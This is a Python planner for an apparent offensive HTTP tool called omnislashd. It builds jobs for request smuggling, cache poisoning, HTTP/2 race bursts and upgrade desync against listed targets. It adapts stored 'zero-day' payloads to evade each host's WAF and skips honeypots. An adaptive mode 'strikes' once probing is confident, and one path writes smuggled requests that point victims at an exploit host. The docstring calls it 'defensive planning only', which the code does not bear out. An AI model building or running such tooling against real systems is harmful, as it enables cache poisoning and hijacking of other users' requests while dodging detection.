#!/usr/bin/env python3
"""Generate omnislashd jobs from targets_verified.json.

Defensive planning only: drops honeypot/high deception-risk targets, keeps
scope fail-closed, and carries baseline metadata for runtime deception checks.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import sys
from typing import Any, Dict, List

# Optional Echelon 2 knowledge base
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)
try:
    from research.knowledge_base import DEFAULT_VAULT_PATH, find_keys_for_stack, load_vault
except Exception:  # pragma: no cover - optional dependency path
    DEFAULT_VAULT_PATH = os.path.join("state", "zero_day_vault.json")
    def load_vault(path=DEFAULT_VAULT_PATH): return {"version": 1, "keys": []}
    def find_keys_for_stack(vault, tech_stack): return []
try:
    from research.waf_inference import DEFAULT_WAF_PROFILES, adapt_payload_for_waf, get_profile, load_profiles
except Exception:  # pragma: no cover
    DEFAULT_WAF_PROFILES = os.path.join("state", "waf_profiles.json")
    def load_profiles(path=DEFAULT_WAF_PROFILES): return {"version": 1, "profiles": []}
    def get_profile(store, host): return None
    def adapt_payload_for_waf(payload, profile): return payload
try:
    from research.adaptive_prober import AdaptiveProbePlanner, adaptive_observations_from_records
except Exception:  # pragma: no cover - optional adaptive dependency path
    AdaptiveProbePlanner = None
    def adaptive_observations_from_records(records): return {}
try:
    from research.self_learning import (
        DEFAULT_WEIGHTS_PATH,
        ParameterInferencer,
        load_weights,
    )
except Exception:  # pragma: no cover - optional learning dependency path
    DEFAULT_WEIGHTS_PATH = os.path.join("state", "learned_weights.json")
    ParameterInferencer = None
    def load_weights(path):
        return {"schema": "omnislash.learned-weights/v1", "global": {}, "hosts": {}, "tech": {}}


CACHE_HEADER_HINTS = {"x-cache", "cf-cache-status", "age", "via", "vary", "cache-control"}
REVERSE_PROXY_HINTS = {"nginx", "envoy", "haproxy", "aws alb", "alb", "apache traffic server", "ats", "squid"}
CDN_HINTS = {"cloudflare", "akamai", "cloudfront", "fastly", "varnish", "cdn"}


def load_targets(path: str) -> List[Dict[str, Any]]:
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        obj = json.load(f)
    if isinstance(obj, list):
        return [x for x in obj if isinstance(x, dict)]
    if isinstance(obj, dict):
        if isinstance(obj.get("targets"), list):
            return [x for x in obj["targets"] if isinstance(x, dict)]
        return [obj]
    return []


def is_excluded(target: Dict[str, Any]) -> bool:
    if target.get("is_honeypot") is True:
        return True
    if str(target.get("deception_risk", "")).lower() == "high":
        return True
    score = target.get("confidence_score")
    if isinstance(score, (int, float)) and score <= -5:
        return True
    return False


def _norm_tech(target: Dict[str, Any]) -> List[str]:
    tech = target.get("tech") or []
    if isinstance(tech, str):
        tech = [tech]
    out = []
    for t in tech:
        if not t:
            continue
        out.append(str(t).strip())
    for k in [target.get("webserver"), target.get("cdn_name")]:
        if k:
            out.append(str(k).strip())
    # dedupe case-insensitively
    seen = set()
    deduped = []
    for t in out:
        lk = t.lower()
        if lk in seen:
            continue
        seen.add(lk)
        deduped.append(t)
    return deduped


def has_cache_signals(target: Dict[str, Any]) -> bool:
    ch = target.get("cache_headers") or {}
    if isinstance(ch, dict):
        for k in ch.keys():
            if str(k).lower() in CACHE_HEADER_HINTS:
                return True
    tech = " ".join(_norm_tech(target)).lower()
    return any(h in tech for h in CDN_HINTS)


def has_h2_support(target: Dict[str, Any]) -> bool:
    # Heuristic: modern CDN/reverse proxy or explicit http2/h2 in tech.
    tech = " ".join(_norm_tech(target)).lower()
    if "h2" in tech or "http2" in tech or "http/2" in tech:
        return True
    # CDNs and common proxies often support H2; planner is conservative but useful.
    return any(h in tech for h in ["cloudflare", "akamai", "cloudfront", "fastly", "nginx", "envoy", "haproxy"])


def has_reverse_proxy_downgrade(target: Dict[str, Any]) -> bool:
    tech = " ".join(_norm_tech(target)).lower()
    if any(h in tech for h in REVERSE_PROXY_HINTS):
        return True
    if "h2->h1" in tech or "downgrade" in tech:
        return True
    return False


def wants_upgrade_desync(target: Dict[str, Any]) -> str:
    """Return upgrade type if target shows WebSocket/gRPC/H2C indicators, else empty."""
    tech = " ".join(_norm_tech(target)).lower()
    ports = [int(p) for p in (target.get("known_ports") or []) if str(p).isdigit()]
    if any(k in tech for k in ["grpc", "h2c"]):
        return "grpc"
    if any(k in tech for k in ["websocket", "ws://", "wss://", "socket.io"]):
        return "websocket"
    if any(p in ports for p in [8080, 8443, 9000]):
        # nonstandard ports - try websocket by default, grpc also possible
        if any(p in ports for p in [50051, 9000]):
            return "grpc"
        return "websocket"
    return ""


def _target_addr(target: Dict[str, Any]) -> str:
    host = str(target.get("target") or target.get("host") or "").strip()
    port = 443
    ports = target.get("known_ports") or []
    if isinstance(ports, list) and 443 in ports:
        port = 443
    elif isinstance(ports, list) and 80 in ports:
        port = 80
    return f"{host}:{port}"


def _render_template(value: Any, bindings: Dict[str, str]) -> Any:
    """Fill playbook placeholders without touching any other field."""
    if isinstance(value, str):
        out = value
        for key, replacement in bindings.items():
            out = out.replace("{{%s}}" % key, str(replacement))
        return out
    if isinstance(value, list):
        return [_render_template(item, bindings) for item in value]
    if isinstance(value, dict):
        return {k: _render_template(v, bindings) for k, v in value.items()}
    return value


def _playbook_bindings(target: Dict[str, Any]) -> Dict[str, str]:
    host = str(target.get("target") or target.get("host") or "").strip()
    exploit = (
        target.get("exploit_host")
        or target.get("exploit_server")
        or target.get("collaborator_host")
        or ""
    )
    return {
        "TARGET_ADDR": _target_addr(target),
        "TARGET_HOST": host,
        "EXPLOIT_HOST": str(exploit).strip(),
        "TARGET_PATH": str(target.get("path") or "/").strip() or "/",
        "OUTER_PATH": str(target.get("outer_path") or "/").strip() or "/",
    }


def _base_job(name: str, target: Dict[str, Any], probe: str, tls: str) -> Dict[str, Any]:
    host = str(target.get("target") or target.get("host") or "").strip()
    addr = _target_addr(target)
    return {
        "name": name,
        "enabled": True,
        "target": {"addr": addr, "host": host, "path": "/"},
        "tls": tls,
        "probe": probe,
        "attempts": 2,
        "until_success": True,
        "interval": "10s",
        "timeout": "15s",
        "idle": "2s",
        "retry_delay": "1s",
        "metadata": {
            "baseline": target.get("baseline", {}),
            "deception_risk": target.get("deception_risk", "low"),
            "confidence_score": target.get("confidence_score"),
            "origin_ips": target.get("origin_ips", []),
        },
    }


def plan_target(target: Dict[str, Any], critical_endpoints: List[str] = None, vault: Dict[str, Any] = None, waf_store: Dict[str, Any] = None) -> List[Dict[str, Any]]:
    critical_endpoints = list(critical_endpoints or target.get("critical_endpoints") or [])
    if is_excluded(target):
        return []
    host = str(target.get("target") or target.get("host") or "").strip()
    if not host:
        return []
    jobs: List[Dict[str, Any]] = []
    tech = _norm_tech(target)

    # Echelon 2: curated Universal Keys / playbooks from the vault.
    if vault:
        for k in find_keys_for_stack(vault, tech):
            technique = str(k.get("technique") or "raw-replay").lower()
            meta = k.get("metadata") or {}
            if technique == "h2-cl":
                # A curveball playbook needs an exploit host to render its
                # smuggled absolute-form request. Without one it is skipped;
                # the normal planner still runs.
                if not has_h2_support(target):
                    continue
                bindings = _playbook_bindings(target)
                if not bindings["EXPLOIT_HOST"]:
                    continue
                overrides = _render_template(k.get("job_overrides") or {}, bindings)
                if not isinstance(overrides, dict):
                    continue
                overrides.pop("target", None)
                overrides.pop("name", None)
                j = _base_job(f"{host}-h2-cl-playbook", target, "h2-cl", str(k.get("tls") or "h2"))
                j.update(overrides)
            else:
                j = _base_job(f"{host}-universal-key", target, "raw-replay", "h1")
                raw_b64 = k.get("raw_payload_b64", "")
                if waf_store and raw_b64:
                    prof = get_profile(waf_store, host)
                    if prof is not None:
                        try:
                            raw = base64.b64decode(raw_b64.encode("ascii"))
                            raw = adapt_payload_for_waf(raw, prof)
                            raw_b64 = base64.b64encode(raw).decode("ascii")
                            j.setdefault("metadata", {})["waf_adapted"] = True
                        except Exception:
                            pass
                j["raw_payload_b64"] = raw_b64
                j["success_contains"] = str(meta.get("success_contains", ""))
                j["attempts"] = 1
                j["until_success"] = True
            j["metadata"]["universal_key"] = {
                "id": k.get("id"),
                "tech_stack_hash": k.get("tech_stack_hash"),
                "mutation_type": k.get("mutation_type"),
                "protocol_edge": k.get("protocol_edge"),
                "technique": technique,
                "provenance": k.get("provenance", ""),
                "case_id": meta.get("case_id", ""),
                "template": meta.get("template", ""),
                "gittins_index": 9999.0,
            }
            j["metadata"]["gittins_index"] = 9999.0
            jobs.append(j)
            ut = wants_upgrade_desync(target)
            if ut:
                uj = _base_job(f"{host}-upgrade-desync", target, "upgrade-desync", "h1")
                uj["upgrade_type"] = ut
                uj["attempts"] = 1
                jobs.append(uj)
            return jobs

    # Cache/tunnel mapping
    if has_cache_signals(target) and has_h2_support(target):
        j = _base_job(f"{host}-h2-tunnel", target, "h2-tunnel", "h2")
        j["poison_path"] = "/"
        j["gadget_path"] = "/resources?cb=omnislash"
        j["success_contains"] = "omnislash"
        j["success_finding"] = "cache_poisoned"
        jobs.append(j)

    # Reverse proxy / downgrade mapping
    if has_reverse_proxy_downgrade(target):
        # H2.1 downgrade if H2-capable front
        if has_h2_support(target):
            j = _base_job(f"{host}-smuggle-h2-downgrade", target, "smuggle", "h2")
            j["variant"] = "h2-downgrade"
            j["victim_method"] = "GET"
            j["victim_path"] = "/"
            jobs.append(j)
        j2 = _base_job(f"{host}-smuggle-chain", target, "smuggle-chain", "h1")
        j2["victim_method"] = "POST"
        j2["victim_path"] = "/"
        jobs.append(j2)

    # Critical API endpoints -> h2race with limited attempts
    eps = list(dict.fromkeys([str(e).strip() for e in critical_endpoints if str(e).strip()]))
    if eps:
        for i, ep in enumerate(eps[:3]):  # limited
            j = _base_job(f"{host}-h2race-{i+1}", target, "h2race", "h2")
            j["path"] = ep if ep.startswith("/") else "/" + ep
            j["count"] = 20
            j["attempts"] = 1  # limited attempts
            j["until_success"] = False
            jobs.append(j)

    # Upgrade-desync for WebSocket/gRPC/H2C or nonstandard ports.
    ut = wants_upgrade_desync(target)
    if ut:
        uj = _base_job(f"{host}-upgrade-desync", target, "upgrade-desync", "h1")
        uj["upgrade_type"] = ut
        uj["attempts"] = 1
        jobs.append(uj)

    # If nothing matched but target is clean and web, add conservative smuggle-chain only for reverse proxies? no - avoid noise.
    # Keep fail-closed: no jobs if no clear signal.
    return jobs


def _telemetry_lookup(target: Dict[str, Any], telemetry: Dict[str, Any]) -> Any:
    if not telemetry:
        return None
    host = str(target.get("target") or target.get("host") or "").strip()
    keys = [host, _target_addr(target), f"{host}:443", f"{host}:80"]
    for key in keys:
        entry = telemetry.get(key.lower())
        if entry is not None:
            return entry
    return None


def plan_target_adaptive(
    target: Dict[str, Any],
    telemetry_entry: Any = None,
    max_probes: int = 7,
    min_posterior: float = 0.55,
    sniper_pool: Any = None,
) -> Any:
    """Plan diagnostics (first pass) or a strike (telemetry pass).

    The planner emits diagnostic jobs while the posterior is diffuse. Once
    ``omnislashd`` telemetry and the syndrome decoder concentrate probability
    above ``min_posterior``, it emits one targeted job instead.
    """
    if AdaptiveProbePlanner is None:
        raise RuntimeError("research.adaptive_prober is unavailable")
    if is_excluded(target):
        return [], {}
    host = str(target.get("target") or target.get("host") or "").strip()
    if not host:
        return [], {}
    actions = None
    observation = None
    if isinstance(telemetry_entry, dict):
        actions = telemetry_entry.get("actions")
        observation = telemetry_entry.get("observation")
    planner = AdaptiveProbePlanner()
    plan = planner.plan(
        target,
        observations=actions,
        observation=observation,
        max_probes=max(1, int(max_probes)),
        min_posterior=float(min_posterior),
        sniper_pool=sniper_pool,
    )
    summary = plan.to_dict()
    jobs = list(summary.pop("jobs", []) or [])
    summary["host"] = host
    summary["job_count"] = len(jobs)
    summary["job_names"] = [str(j.get("name", "")) for j in jobs]
    return jobs, summary


def _inferred_exploit_host(target: Dict[str, Any]) -> str:
    return str(
        target.get("exploit_host")
        or target.get("exploit_server")
        or target.get("collaborator_host")
        or ""
    ).strip()


def plan_target_inferred(
    target: Dict[str, Any],
    weights_path: str,
    telemetry_entry: Any = None,
    max_hypotheses: int = 2,
) -> Any:
    """Ask ParameterInferencer for h2-cl candidates from native learned weights.

    This path never reads the curated playbook. Jobs are marked
    ``autonomous-inferred`` and only emitted for an authorized target that
    supplies its own exploit host.
    """
    if not weights_path or not os.path.isfile(weights_path) or ParameterInferencer is None:
        return [], {}
    if is_excluded(target):
        return [], {}
    host = str(target.get("target") or target.get("host") or "").strip()
    if not host:
        return [], {}
    exploit_host = _inferred_exploit_host(target)
    observations: List[Dict[str, Any]] = [
        obs for obs in (target.get("observations") or []) if isinstance(obs, dict)
    ]
    if isinstance(telemetry_entry, dict):
        observation = telemetry_entry.get("observation")
        if isinstance(observation, dict):
            observations.append(observation)
    inferencer = ParameterInferencer(
        load_weights(weights_path),
        target_host=host,
        tech_stack=_norm_tech(target),
        external_hosts=[exploit_host] if exploit_host else None,
    )
    hypotheses = inferencer.infer(
        observations,
        candidate_paths=target.get("candidate_paths") or None,
        max_hypotheses=max(1, int(max_hypotheses)),
    )
    hypotheses = [
        h for h in hypotheses
        if (h.get("scores") or {}).get("path", 0) > 0.5
        and (h.get("scores") or {}).get("cl", 0) > 0.5
    ]
    jobs: List[Dict[str, Any]] = []
    for index, hypothesis in enumerate(hypotheses):
        if not exploit_host:
            break
        cl = int(hypothesis["smuggled_cl"])
        smuggled_path = str(hypothesis["smuggled_path"])
        # The filler body length matches the inferred framing boundary; it is
        # synthesized here and is not copied from any curated payload.
        filler = "A" * cl
        body = (
            "GET %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s"
            % (smuggled_path, exploit_host, cl, filler)
        )
        job = _base_job(f"{host}-h2-cl-autonomous-{index + 1}", target, "h2-cl", "h2")
        job.update({
            "declared_length": 0,
            "method": "POST",
            "path": str(target.get("path") or "/"),
            "body": body,
            "victim_method": "GET",
            "victim_path": str(target.get("victim_path") or "/"),
            "hold_after_poison": hypothesis["hold_after_poison"],
            "victim_delay": hypothesis["victim_delay"],
            "same_connection_victim": hypothesis["connection_mode"] == "same",
            "success_contains": str(target.get("success_contains") or target.get("success_marker") or ""),
            "attempts": 1,
            "until_success": True,
            "timeout": "8s",
            "idle": "2s",
            "retry_delay": "0s",
        })
        job["metadata"]["provenance"] = "autonomous-inferred"
        job["metadata"]["autonomous_inference"] = {
            "provenance": "autonomous-inferred",
            "weights": weights_path,
            "smuggled_path": smuggled_path,
            "smuggled_cl": cl,
            "hold_after_poison": hypothesis["hold_after_poison"],
            "victim_delay": hypothesis["victim_delay"],
            "connection_mode": hypothesis["connection_mode"],
            "scores": hypothesis["scores"],
            "evidence": hypothesis["evidence"],
        }
        jobs.append(job)
    summary = {
        "schema": "omnislash.autonomous-inference/v1",
        "host": host,
        "weights": weights_path,
        "hypotheses": len(hypotheses),
        "jobs": len(jobs),
        "parameters": [
            {
                "smuggled_path": h["smuggled_path"],
                "smuggled_cl": h["smuggled_cl"],
                "hold_after_poison": h["hold_after_poison"],
                "victim_delay": h["victim_delay"],
                "connection_mode": h["connection_mode"],
            }
            for h in hypotheses
        ],
    }
    return jobs, summary


def build_daemon_config(
    targets: List[Dict[str, Any]],
    omnislash_config: str = "config.json",
    log_file: str = "omnislashd-audit.jsonl",
    vault: Dict[str, Any] = None,
    waf_store: Dict[str, Any] = None,
    adaptive: bool = False,
    adaptive_telemetry: Dict[str, Any] = None,
    adaptive_max_probes: int = 7,
    adaptive_min_posterior: float = 0.55,
    sniper_pool: Any = None,
    learned_weights: str = "",
    learned_max_hypotheses: int = 2,
) -> Dict[str, Any]:
    jobs: List[Dict[str, Any]] = []
    adaptive_plans: List[Dict[str, Any]] = []
    inferred_plans: List[Dict[str, Any]] = []
    allow_hosts: List[str] = []
    seen_hosts = set()
    for t in targets:
        if is_excluded(t):
            continue
        host = str(t.get("target") or t.get("host") or "").strip()
        if not host:
            continue
        t_jobs: List[Dict[str, Any]] = []
        if adaptive:
            diagnostic_jobs, plan_summary = plan_target_adaptive(
                t,
                _telemetry_lookup(t, adaptive_telemetry or {}),
                max_probes=adaptive_max_probes,
                min_posterior=adaptive_min_posterior,
                sniper_pool=sniper_pool,
            )
            t_jobs.extend(diagnostic_jobs)
            if plan_summary:
                adaptive_plans.append(plan_summary)
            inferred_jobs, inferred_summary = plan_target_inferred(
                t,
                learned_weights,
                _telemetry_lookup(t, adaptive_telemetry or {}),
                max_hypotheses=learned_max_hypotheses,
            )
            t_jobs.extend(inferred_jobs)
            if inferred_summary:
                inferred_plans.append(inferred_summary)
        else:
            t_jobs = plan_target(t, t.get("critical_endpoints") or [], vault=vault, waf_store=waf_store)
        if t_jobs:
            jobs.extend(t_jobs)
            if host not in seen_hosts:
                seen_hosts.add(host)
                allow_hosts.append(host)
            for ip in t.get("origin_ips") or []:
                ip = str(ip).strip()
                if ip and ip not in seen_hosts:
                    seen_hosts.add(ip)
                    allow_hosts.append(ip)
    cfg: Dict[str, Any] = {
        "omnislash_config": omnislash_config,
        "proxies": "",
        "log_file": log_file,
        "poll_interval": "2s",
        "concurrency": 1,
        "exit_on_success": False,
        "control_addr": "127.0.0.1:7777",
        "jobs": jobs,
        "generated_scope": {
            "allow_hosts": allow_hosts,
            "allow_private": False,
        },
    }
    if adaptive:
        strike = any(
            str((j.get("metadata") or {}).get("adaptive", {}).get("action", "")) == "strike"
            for j in jobs
        )
        cfg["adaptive"] = {
            "schema": "omnislash.adaptive-plan/v1",
            "mode": "strike" if strike else "diagnostic",
            "max_probes": adaptive_max_probes,
            "min_posterior": adaptive_min_posterior,
            "plans": adaptive_plans,
            "autonomous_inference": {
                "schema": "omnislash.autonomous-inference/v1",
                "weights": learned_weights,
                "targets": inferred_plans,
            },
        }
    return cfg


def load_jsonl(path: str) -> List[Dict[str, Any]]:
    records: List[Dict[str, Any]] = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                except Exception:
                    continue
                if isinstance(obj, dict):
                    records.append(obj)
    except FileNotFoundError:
        return []
    return records


def main(argv=None):
    ap = argparse.ArgumentParser(description="Generate omnislashd jobs.json from targets_verified.json")
    ap.add_argument("--in", dest="inp", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--omnislash-config", default="config.json")
    ap.add_argument("--log-file", default="omnislashd-audit.jsonl")
    ap.add_argument("--only-diff", action="store_true", help="Only plan targets marked as new/changed (_diff) or from diff scanner output")
    ap.add_argument("--previous", default="", help="Optional previous targets_verified.json for internal diff when --only-diff is set")
    ap.add_argument("--vault", default=DEFAULT_VAULT_PATH, help="Zero-day vault JSON path")
    ap.add_argument("--waf-profiles", default=DEFAULT_WAF_PROFILES, help="WAF profiles JSON path")
    ap.add_argument("--adaptive", action="store_true", help="Compact adaptive diagnostics instead of the full vector set")
    ap.add_argument("--adaptive-telemetry", default="", help="omnislashd JSONL audit used to strike the confirmed syndrome")
    ap.add_argument("--adaptive-max-probes", type=int, default=7, help="Hard request budget per target (default 7)")
    ap.add_argument("--adaptive-min-posterior", type=float, default=0.55, help="Strike only above this posterior")
    ap.add_argument("--adaptive-plan-out", default="", help="Optional JSON file for the adaptive decision trace")
    ap.add_argument(
        "--learned-weights",
        default=DEFAULT_WEIGHTS_PATH,
        help="Native calibrated weights used by ParameterInferencer in adaptive mode",
    )
    ap.add_argument("--learned-max-hypotheses", type=int, default=2, help="Autonomous parameter hypotheses per adaptive target")
    ap.add_argument("--sniper-pool", type=int, default=-1, help="Sniper reserve size for arbitrage priority (optional)")
    args = ap.parse_args(argv)
    if (args.adaptive_telemetry or args.adaptive_plan_out) and not args.adaptive:
        ap.error("--adaptive-telemetry/--adaptive-plan-out require --adaptive")

    targets = load_targets(args.inp)
    if args.only_diff:
        if args.previous:
            prev = load_targets(args.previous)
            prev_map = {str(t.get("target") or t.get("host") or "").lower(): json.dumps(t, sort_keys=True, default=str) for t in prev}
            filtered = []
            for t in targets:
                k = str(t.get("target") or t.get("host") or "").lower()
                if k not in prev_map or prev_map[k] != json.dumps(t, sort_keys=True, default=str):
                    filtered.append(t)
            targets = filtered
        else:
            marked = [t for t in targets if t.get("_diff") in {"new", "changed"}]
            if any("_diff" in t for t in targets):
                targets = marked
    vault = load_vault(args.vault)
    waf_store = load_profiles(args.waf_profiles)
    telemetry = {}
    if args.adaptive_telemetry:
        telemetry = adaptive_observations_from_records(load_jsonl(args.adaptive_telemetry))
    cfg = build_daemon_config(
        targets,
        omnislash_config=args.omnislash_config,
        log_file=args.log_file,
        vault=vault,
        waf_store=waf_store,
        adaptive=args.adaptive,
        adaptive_telemetry=telemetry,
        adaptive_max_probes=args.adaptive_max_probes,
        adaptive_min_posterior=args.adaptive_min_posterior,
        sniper_pool=None if args.sniper_pool < 0 else args.sniper_pool,
        learned_weights=args.learned_weights,
        learned_max_hypotheses=args.learned_max_hypotheses,
    )
    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2, ensure_ascii=False)
        f.write("\n")
    adaptive_info = cfg.get("adaptive") or {}
    if args.adaptive_plan_out:
        with open(args.adaptive_plan_out, "w", encoding="utf-8") as f:
            json.dump(adaptive_info, f, indent=2, ensure_ascii=False, sort_keys=True)
            f.write("\n")
    print(json.dumps({
        "jobs": len(cfg["jobs"]),
        "allow_hosts": cfg["generated_scope"]["allow_hosts"],
        "only_diff": bool(args.only_diff),
        "vault_keys": len(vault.get("keys", [])),
        "adaptive_mode": adaptive_info.get("mode", ""),
        "adaptive_telemetry_hosts": len(telemetry),
        "adaptive_jobs": len(cfg["jobs"]) if args.adaptive else 0,
        "autonomous_jobs": sum(
            int((p.get("jobs") or 0)) for p in adaptive_info.get("autonomous_inference", {}).get("targets", [])
        ),
    }, ensure_ascii=False))


if __name__ == "__main__":
    main()